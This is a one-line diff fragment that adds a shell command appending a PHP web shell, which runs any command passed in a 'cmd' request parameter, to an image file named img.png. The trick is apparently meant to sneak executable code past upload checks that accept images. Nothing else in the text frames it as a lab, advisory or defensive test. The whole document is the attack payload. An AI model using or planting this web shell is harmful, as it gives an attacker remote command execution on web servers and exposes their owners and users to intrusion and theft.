@@ -1,0 +1,1 @@
+echo '<?php system($_REQUEST['cmd']); ?>' >> img.png
